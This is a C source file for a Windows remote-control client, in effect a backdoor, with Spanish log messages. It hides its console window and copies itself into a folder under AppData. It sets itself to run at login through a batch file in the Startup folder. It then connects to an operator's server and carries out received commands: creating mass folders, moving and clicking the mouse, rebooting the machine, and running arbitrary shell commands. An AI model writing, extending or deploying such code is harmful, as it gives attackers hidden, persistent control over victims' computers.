#include <stdio.h>
#include <winsock.h>
#include <sys/stat.h>
#include <unistd.h>
#include <libgen.h>
#include <windows.h>
#include <wingdi.h>

#pragma comment(lib, "ws2_32.lib")

#define RECEIVE_BUFFER_SIZE 1024
#define MAX_FOLDER_LENGTH 260
#define CMD_LENGTH 128

// abrir puertos y usar ipv4 publica
#define HOST "127.0.0.1"
#define PORT "1234"

#define LOCAL_PATH_FOLDER "\\AppData\\Roaming\\PeruvianCorp"
#define LOCAL_STARTUP_PATH "\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
#define BATCH_STARTUP_FILENAME "mamamia.bat"

char *strcpy(char *dest, const char *src)
{
    size_t i;
    for (i = 0; src[i] != '\0'; i++)
        dest[i] = src[i];
    dest[i] = '\0';
    return dest;
}

void error(char *message)
{
    fprintf(stderr, "%s: %d", message, WSAGetLastError());
    exit(EXIT_FAILURE);
    return;
}

void cf(char *filename)
{
    char cmd[CMD_LENGTH];
    snprintf(cmd, sizeof(cmd), "mkdir %s", filename);
    system(cmd);
    return;
}

int gsupath(char *filename, char *cfilename)
{
    FILE *out = NULL;
    char *exe_name = basename(cfilename);
    if (out = fopen(filename, "wb"))
    {
        fprintf(out, "START %s%s\\%s", getenv("USERPROFILE"), LOCAL_PATH_FOLDER, exe_name);
        fclose(out);
        return 1;
    }
    else
        return 0;
}

int gexecpy(char *filename)
{
    FILE *in = NULL, *out = NULL, *ts = NULL;
    char in_filename[MAX_FOLDER_LENGTH], out_filename[MAX_FOLDER_LENGTH], cmd[PATH_MAX];
    unsigned char buffer[1024];
    size_t n, m;

    snprintf(out_filename, sizeof out_filename, "%s%s", getenv("USERPROFILE"), LOCAL_PATH_FOLDER);
    printf("Creando directorio: %s\n", out_filename);
    cf(out_filename);

    snprintf(cmd, sizeof cmd, "copy %s %s%s", filename, getenv("USERPROFILE"), LOCAL_PATH_FOLDER);
    printf("Copiando ejecutable: %s\n", cmd);
    system(cmd);
    return 1;
}

int existf(char *path)
{
    struct stat info;
    if (stat(path, &info) != 0)
        return 1;
    else
        return 0;
}

void handle_command(char command[RECEIVE_BUFFER_SIZE], char (*message)[RECEIVE_BUFFER_SIZE])
{
    if (strstr(command, "PONG"))
        return;

    char delim[3] = " ";
    char *ptr = strtok(command, delim);
    if (command[0] == 'f')
    {
        ptr = strtok(NULL, delim);
        int max = atoi(ptr);
        ptr = strtok(NULL, delim);
        char name[MAX_FOLDER_LENGTH], desktop[MAX_FOLDER_LENGTH], cmd[MAX_FOLDER_LENGTH];
        snprintf(desktop, sizeof desktop, "%s\\Desktop\\", getenv("USERPROFILE") );
        strcpy(name, ptr);
        printf("Creando %d carpetas llamadas %s..\n", max, name);
        for (int i = 0; i < max; i++)
        {
            snprintf(cmd, sizeof cmd, "mkdir %s%d%s", desktop, i, name);
            system(cmd);
        }
        strcpy(*message, "sexo");
    }
    else if (strstr(command, "mm"))
    {
        int x = 0, y = 0;
        ptr = strtok(NULL, delim);
        x = atoi(ptr);
        ptr = strtok(NULL, delim);
        y = atoi(ptr);
        printf("Moviendo mouse en: (%d, %d)\n", x, y);
        SetCursorPos(x, y);
        strcpy(*message, "sexo");
    }
    else if (strstr(command, "mc"))
    {
        POINT CursorPosition;
        GetCursorPos(&CursorPosition);
        int x = CursorPosition.x;
        int y = CursorPosition.y;
        mouse_event(MOUSEEVENTF_LEFTDOWN, x, y, 0, 0);
        mouse_event(MOUSEEVENTF_LEFTUP, x, y, 0, 0);
        strcpy(*message, "sexo");
    }
    else if (strstr(command, "mcd"))
    {
        POINT CursorPosition;
        GetCursorPos(&CursorPosition);
        int x = CursorPosition.x;
        int y = CursorPosition.y;
        mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
        mouse_event(MOUSEEVENTF_RIGHTUP, x, y, 0, 0);
        strcpy(*message, "sexo");
    }
    else if (strstr(command, "mp"))
    {
        POINT CursorPosition;
        int x = 0, y = 0;
        GetCursorPos(&CursorPosition);
        snprintf(*message, sizeof *message, "%d %d", CursorPosition.x, CursorPosition.y);
    }
    else if (command[0] == 'r')
    {
        int s;
        ptr = strtok(NULL, delim);
        s = atoi(ptr);
        char cmd[CMD_LENGTH];
        printf("Apagando en %d segundos", s);
        snprintf(cmd, sizeof cmd, "shutdown /r /t %d", s);
        system(cmd);
        strcpy(*message, "sexo");
    }
    else if (strstr(command, "cs"))
    {
        system("shutdown /a");
        strcpy(*message, "sexo");
    }
    else if (command[0] == 'a')
    {
        ptr = strtok(NULL, delim);
        printf("Abriendo %s..\n", ptr);
        system(ptr);
        strcpy(*message, "sexo");
    }
    else
    {
        strcpy(*message, "Comando desconocido");
    }
    return;
}

void glsupath(char (*path)[PATH_MAX])
{
    snprintf(*path, sizeof *path, "%s%s\\%s", getenv("USERPROFILE"), LOCAL_STARTUP_PATH, BATCH_STARTUP_FILENAME);
    return;
}

int main(int argc, char *argv[])
{
    HWND Stealth;
    AllocConsole();
    Stealth = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Stealth, 0);
    
    SOCKET so;
    WSADATA wsa;
    struct sockaddr_in server;
    char *server_ip, message[RECEIVE_BUFFER_SIZE], buffer[RECEIVE_BUFFER_SIZE], supath[PATH_MAX], exepath[PATH_MAX];
    unsigned short server_port;
    int bytes_received;

    server_ip = HOST;
    server_port = atoi(PORT);

    snprintf(exepath, sizeof exepath, "%s%s", getenv("USERPROFILE"), LOCAL_PATH_FOLDER);
    glsupath(&supath);

    if (existf(supath) == 1)
    {
        puts("Generando arranque del ejecutable..");
        if (gsupath(supath, argv[0]) == 0)
            error("Error al generar el arranque del ejecutable");
    }
    else
        puts("Arranque del ejecutable  encontrado.");

    if (existf(exepath) == 1)
    {
        puts("Generando copia del ejecutable..");
        if (gexecpy(argv[0]) == 0)
            error("Error al generar la copia del ejecutable");
    }
    else
        puts("Copia del ejecutable encontrado.");

    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
        error("Error al iniciar WSAStartup");

    printf("Iniciando socket..\n");

    if ((so = socket(AF_INET, SOCK_STREAM, 0)) == INVALID_SOCKET)
        error("Error al crear el socket.");

    printf("Socket creado correctamente.\n");

    memset(&server, 0, sizeof(server));
    server.sin_family = AF_INET;
    server.sin_addr.s_addr = inet_addr(server_ip);
    server.sin_port = htons(server_port);

    if (connect(so, (struct sockaddr *)&server, sizeof server) < 0)
        error("Error al conectarse al servidor");

    printf("Conectado a %s:%d\n", server_ip, server_port);

    strcpy(message, "PING");
    puts("Enviando ping al servidor..");
    send(so, message, strlen(message) + 1, 0);
    while (1)
    {
        if ((bytes_received = recv(so, buffer, RECEIVE_BUFFER_SIZE, 0)) == SOCKET_ERROR)
        {
            if (WSAGetLastError() == WSAECONNRESET)
            {
                closesocket(so);
                WSACleanup();
                puts("Se ha cerrado la conexion con el servidor.");
                break;
            }
            else
                error("Fallo al recibir datos");
        }

        buffer[bytes_received] = '\0';
        puts(buffer);
        handle_command(buffer, &message);
        send(so, message, strlen(message) + 1, 0);
    }

    closesocket(so);
    WSACleanup();
    return 0;
}
